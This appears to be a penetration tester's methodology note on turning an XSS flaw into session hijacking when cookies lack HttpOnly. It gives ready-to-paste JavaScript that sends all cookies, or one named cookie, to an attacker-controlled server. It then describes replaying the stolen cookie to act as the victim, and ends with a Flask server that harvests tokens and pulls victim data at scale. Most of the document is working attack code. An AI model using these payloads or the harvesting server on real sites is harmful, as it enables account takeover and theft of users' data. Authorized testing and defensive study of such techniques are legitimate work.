Suppose the HttpOnly attribute is disabled for the primary session token. In that case, we can use the local JavaScript in our XSS payload to exfiltrate the cookie and send it to an external location.

This Impact Technique has two steps:
1. Retrieve the cookie
2. Use the cookie

# 1. Retrieving the Cookie

Here are some examples of JavaScript code we can use. These examples assume you've already discovered a working XSS payload. So, they do not include the surrounding HTML attributes (`<script>`, `<img>`, etc.). 

Use one example from this list to retrieve the victim's session cookie. Paste an example below into your XSS payload, in place of `alert(1)` or whatever original JavaScript you used to detect the XSS vulnerability. Then, replace `<SERVER-URL>` with your external server URL (Burp Collaborator, etc.).

## Exfiltrate All Cookies

```javascript
fetch("<SERVER-URL>/cookie?" + encodeURIComponent(document.cookie));
```
- Uses the [fetch API](https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API/Using_Fetch)

## Exfiltrate Specific Cookie
```javascript
function getCookie(t){let e=t+"=",n=decodeURIComponent(document.cookie).split(";");for(let r=0;r<n.length;r++){let i=n[r];for(;" "==i.charAt(0);)i=i.substring(1);if(0==i.indexOf(e))return i.substring(e.length,i.length)}return""};

fetch("<SERVER-URL>/cookie?<COOKIE-NAME>=" + encodeURIComponent(getCookie("<COOKIE-NAME>")));
```
- Sometimes, it is helpful to extract only a specific cookie or group of cookies. In this case, we need a function to pull a cookie by name.
- Substitute `<COOKIE-NAME>` with the name of the cookie you want to exfiltrate.

# 2. Using the Cookie

After you have the user's session cookie, use the technique below to demonstrate impact.

## Burp Collaborator (Manual)
If you chose Burp Collaborator as your external server above, you probably received a cookie like so:
![](Pasted%20image%2020240124093524.png)

Copy the cookie to your clipboard. 

Then, open the developer console and paste the cookie into your browser:
(Firefox)
![](Pasted%20image%2020240124094121.png)

(Chrome)
![](Pasted%20image%2020240124094240.png)

Now, refresh the web page. You should be logged in as the target user. Perform some interesting action like downloading their data, making a purchase, sending a message, etc.

## Flask Server (Automated):
You can use the following Flask server to automate the process. You should use this Flask Server if you need to demonstrate how an attack could be performed at scale. For example, if your impact involves using the exfiltrated session token to steal some form of sensitive data from the user's account, it would not be feasible to manually hijack each compromised user's session and download the data. Instead, you could send the exfiltrated cookie to a Flask server, which automatically performs the data exfiltration:

```python
from flask import Flask, request
import requests

app = Flask(__name__)

@app.route('/exfiltrate')
def index():
    token = request.args.get('<COOKIE-NAME>')
    cookies = {"<COOKIE-NAME>": token}

	# Change request as needed
    r = requests.get("<TARGET-SERVER-URL>", cookies=cookies)
    
    # Change "collection" method as needed; e.g., print to console, write to file, etc.
    print(r.text)
    return "OK"


app.run(host='0.0.0.0', port=80)

```
- Replace `<COOKIE-NAME>` with the name of the cookie you have exfiltrated (this code assumes the cookie will arrive as a GET parameter)
- Replace `<TARGET-SERVER-URL>` with the URL and endpoint that serves the sensitive data you wish to collect.
- If you aren't collecting sensitive data, or the sensitive data endpoint doesn't accept GET requests, change the call(s) to `requests.get` as needed.
- Change the collection method as needed (e.g., the above example just dumps the entire response to the console; you may wish to save the data to a file, etc.).
- Run with `python3 app.py` (may need `sudo`). 
- Make sure port 80 is publicly accessible on your server.